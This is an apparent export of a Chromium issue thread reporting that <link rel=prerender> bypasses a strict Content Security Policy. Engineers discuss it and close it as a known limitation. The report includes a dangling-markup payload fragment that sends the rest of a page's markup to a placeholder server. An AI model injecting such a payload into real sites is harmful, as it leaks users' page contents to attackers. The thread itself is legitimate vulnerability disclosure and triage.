@@ -1,0 +1,206 @@
+Issue ID: 352496180
+
+Author: ch...@google.com
+This is a known limitation of CSP. Prerender in this case is similar to navigating and receiving a 204, and CSP does not cover navigations, so CSP today is not set up to protect against exfiltration. In other words, it&#39;s the former :)<br>See <a href="https://www.google.com/url?q=https://github.com/w3c/webappsec-csp/issues/502&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw2A9voC9yvQYVKBK3kgsFeW" target="_blank" rel="noopener noreferrer nofollow ugc" data-b-widget="url" data-b-original-href="https://github.com/w3c/webappsec-csp/issues/502" data-b-redirected-href="https://www.google.com/url?q=https://github.com/w3c/webappsec-csp/issues/502&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw2A9voC9yvQYVKBK3kgsFeW">https://github.com/w3c/webappsec-csp/issues/502</a><br><br>CCing Antonio Sartori as the domain expert (perhaps you can assign to the right person or close as WAI?)<br><br>In any case I don&#39;t think this should have limited visibility. There are numerous possibilities of CSP-bypassing exfiltration and I am not aware of a current effort to mitigate them.
+
+Author: ch...@google.com
+link rel prerender may be used to exfiltrate markup under strict CSP
+
+Author: ch...@google.com
+google_domain
+
+Author: # Steps to reproduce the problem
+1. Change href in the attached prerender.html accordingly.
+2. Open prerender.html in a window, preferably a Guest one since prerender does not work in Incognito.
+
+# Problem Description
+Even when CSP is configured in the strictest form, i.e. `default-src: 'none'`, `<link rel="prerender">` connects and sends a GET request to an arbitrary URL. Combined with Dangling Markup Injection, it may be possible for an attacker to inject `<link rel="prerender" href='https://server/?` where the rest of the markup is sent to the server in a GET query.
+
+Similar issues include 40085912 and 40092640. The former issue fixes some of the issues brought by other pre- keywords. The latter issue makes use of `rel=dns-prefetch` and `rel=preconnect`, but requires an attacker-controlled script with lenient CSP policies to execute exfiltration. The current issue only requires a markup injection, and works on pages with the strictest CSP policy.
+
+Some of the comments in the issues note that it is a limitation of CSP. From what I can understand, CSP has been amended[^1] that resource hints like `preconnect`, `dns-prefetch`, `prerender` should follow the `default-src` directive. CSP 3's Directive Algorithms seem to also state the same[^2], which the current issue shows otherwise.
+
+[^1]: https://github.com/w3c/webappsec-csp/pull/582
+[^2]: https://www.w3.org/TR/CSP3/#effective-directive-for-a-request
+
+# Summary
+link rel prerender may be used to exfiltrate markup under strict CSP
+
+# Custom Questions
+#### Reporter credit: 
+Dongsung "Donny" Kim (@kid1ng)
+
+# Additional Data
+Category: Security \
+Chrome Channel: Stable \
+Regression: N/A
+TVdRM01HVXhZMlZrWXpnek5tVm1NVE16TUdRNFl6ZzFOelE1TkdVMFpqQT0=
+
+Author: ki...@gmail.com
+link rel prerender may be used to exfiltrate markup under strict CSP
+
+Author: ki...@gmail.com
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: ki...@gmail.com
+public_non_google
+
+Author: se...@chromium.org
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: se...@chromium.org
+public_non_google
+
+Author: pe...@google.com
+type.googleapis.com/google.protobuf.Int64Value
+
+Author: pe...@google.com
+google_domain
+
+Author: fl...@google.com
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: fl...@google.com
+googlers_unrestricted
+
+Author: fl...@google.com
+<p>You say:</p>
+<p><code>&lt;link rel=&quot;prerender&quot;&gt; connects and sends a GET request to an arbitrary URL</code></p>
+<p>Can you explain why you believe this is occurring?  I&#39;ve tried this out on my machine and the Network tab in developer tools shows no evidence of a request for anything.  If you can provide more detail or a video of what problem you&#39;re seeing, we&#39;ll have a better shot of understanding whether there&#39;s a problem here.</p>
+
+Author: fl...@google.com
+type.googleapis.com/google.protobuf.Int64Value
+
+Author: ki...@gmail.com
+<p>I believe it is simply the expected behavior of <code>prerender</code>, although the network request not showing up in Developer Tools is described in <a href="https://issues.chromium.org/issues/41488153" data-b-widget="issue-reference" data-b-issue-id="41488153">issue 41488153</a>.</p>
+<p>Below attached video is the recreation of the issue. The upper window is an arbitrary server running at <code>jbwviopyrdcckbvwkolakoy4th53mwdv3.oast.fun</code>. As soon as I load <code>prerender.html</code>, the server receives a GET request from the page. Note the <code>Purpose: prefetch</code> header.</p>
+
+Author: ki...@gmail.com
+TXpVeU5EazJNVGd3TFRVM09EYzJNVGt3TFMwNE5ERXlNRFk1TVE9PQ==
+
+Author: pe...@google.com
+<p>Thank you for providing more feedback. Adding the requester to the CC list.</p>
+
+Author: nr...@chromium.org
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: nr...@chromium.org
+public_non_google
+
+Author: fl...@google.com
+type.googleapis.com/google.protobuf.Int32Value
+
+Author: fl...@google.com
+type.googleapis.com/google.devtools.issuetracker.v1.CustomFieldValue
+
+Author: pe...@google.com
+Blink, Blink>SecurityFeature, Blink>SecurityFeature>ContentSecurityPolicy
+
+Author: fl...@google.com
+type.googleapis.com/google.protobuf.StringValue
+
+Author: fl...@google.com
+TldFell6RmtaVE0zT1RsbE9HTTVPVGcyWVRnMlpEaG1aV1V6TW1ReVpEVT0=
+
+Author: Oh, huh, I didn't know about that bug wrt prerender not appearing in the network tab, thank you.
+
+I can now confirm this bug works as described.
+
+nrosenthal@, any chance you could take a look at this?  In particular:
+
+(1) I'd like your opinion on whether this, like the case discussed in bug 40092640, is a known limitation of CSP, or whether this reflects a new end-run around CSP.  I am provisionally setting the severity of this to S2, in case it's the latter, but the subleties/discussions around this in the linked bugs I've read are a bit outside my area of expertise, so I'd really appreciate your perspective.
+
+(2) If it does represent the latter, could you assign to the right person to fix?
+
+Thanks!
+TldFell6RmtaVE0zT1RsbE9HTTVPVGcyWVRnMlpEaG1aV1V6TW1ReVpEVT0=
+
+Author: nr...@chromium.org
+type.googleapis.com/google.protobuf.Int32Value
+
+Author: an...@chromium.org
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: an...@chromium.org
+public_non_google
+
+Author: nr...@chromium.org
+This is a known limitation of CSP. Prerender in this case is similar to navigating and receiving a 204, and CSP does not cover navigations, so CSP today is not set up to protect against exfiltration. In other words, it&#39;s the former :)<br>See <a href="https://www.google.com/url?q=https://github.com/w3c/webappsec-csp/issues/502&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw2A9voC9yvQYVKBK3kgsFeW" target="_blank" rel="noopener noreferrer nofollow ugc" data-b-widget="url" data-b-original-href="https://github.com/w3c/webappsec-csp/issues/502" data-b-redirected-href="https://www.google.com/url?q=https://github.com/w3c/webappsec-csp/issues/502&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw2A9voC9yvQYVKBK3kgsFeW">https://github.com/w3c/webappsec-csp/issues/502</a><br><br>CCing Antonio Sartori as the domain expert (perhaps you can assign to the right person or close as WAI?)<br><br>In any case I don&#39;t think this should have limited visibility. There are numerous possibilities of CSP-bypassing exfiltration and I am not aware of a current effort to mitigate them.
+
+Author: dr...@chromium.org
+TVRZeU1qa3lORGsyWWpjNU1XRmxOamMwWVdOaU9UazVOVE5tTkdVeU9HWT0=
+
+Author: dr...@chromium.org
+public_non_google
+
+Author: [security triage] I'd like to get a decision made about whether this is a bug or not, so we can finish triage. Changing assignee to antoniosartori@ to make that responsibility clear.
+TVRZeU1qa3lORGsyWWpjNU1XRmxOamMwWVdOaU9UazVOVE5tTkdVeU9HWT0=
+
+Author: dr...@chromium.org
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: mk...@chromium.org
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: mk...@chromium.org
+public_non_google
+
+Author: an...@chromium.org
+<p>Actually, the fact that this only requires markup injection seems bad to me and I think that CSP should protect against this kind of exfiltration attacks.</p>
+<p>CC Mike for a second opinion.</p>
+
+Author: an...@chromium.org
+type.googleapis.com/google.protobuf.Int32Value
+
+Author: pe...@google.com
+type.googleapis.com/google.devtools.issuetracker.v1.CustomFieldValue
+
+Author: pe...@google.com
+TXpVMFltRXdNalk1TXpZMk9UWXlZelpoTkdJM01XVXpaRGRsTW1ZNVpEST0=
+
+Author: pe...@google.com
+<p>Setting Priority to P1 to match Severity s2. If this is incorrect, please reset the priority. The automation bot account won&#39;t make this change again.</p>
+
+Author: an...@chromium.org
+<p>I had a chat with Mike West and he convinced me that, while CSP is trying to prevent some exfiltration attacks, it does not protect against all of them (in particular, it does not cover navigations), and this is not worse than other exfiltration possibilities.</p>
+<p>So I guess we can agree with <a href="https://issues.chromium.org/issues/352496180#comment6" data-b-widget="issue-reference" data-b-issue-id="352496180" data-b-comment-number="6">comment#6</a>, and close as WAI for now.</p>
+<p>I guess it could still make sense to consider whether link rel prerender should be covered by the same logic protecting prefetch, but that&#39;s a conversation that we can have on github.</p>
+
+Author: ki...@gmail.com
+<p>Thank you for the responses.</p>
+<p>After some thoughts, I agree that the current issue is not more severe than other publicly known CSP bypass techniques. Personally, it feels like the limitations of CSP in this avenue are not being well-communicated to the public, but this is not the right venue to discuss.</p>
+<p>However, it doesn&#39;t seem completely right to me this is <em>intended behavior</em>. The CSP editor&#39;s draft does state <code>If request’s initiator is &quot;prefetch&quot; or &quot;prerender&quot;, return default-src.</code> where this protection is not enforced by Chromium.</p>
+<p>I think it&#39;s more suitable to keep this bug open as a Bug until the protection is implemented, or <code>&lt;link rel=prerender&gt;</code> is removed (basically same as <a href="https://issues.chromium.org/issues/41488153" data-b-widget="issue-reference" data-b-issue-id="41488153">bug 41488153</a>.) If it&#39;s too much of a hassle, that&#39;s also okay.</p>
+
+Author: nr...@chromium.org
+type.googleapis.com/google.protobuf.Int64Value
+
+Author: pe...@google.com
+<p>This bug has been closed for more than 14 weeks. Removing issue access restrictions.</p>
+
+Author: pe...@google.com
+type.googleapis.com/google.devtools.issuetracker.v1.IssueAccessLimit
+
+Author: ad...@google.com
+type.googleapis.com/google.protobuf.Int64Value
+
+Author: ad...@google.com
+google_domain
+
+Author: pe...@google.com
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: ar...@chromium.org
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: ar...@chromium.org
+public_non_google
+
+Author: ts...@google.com
+type.googleapis.com/google.protobuf.Int64Value
+
+Author: ts...@google.com
+googlers_unrestricted
+
+Author: ch...@google.com
+type.googleapis.com/google.devtools.issuetracker.v1.CustomFieldValue
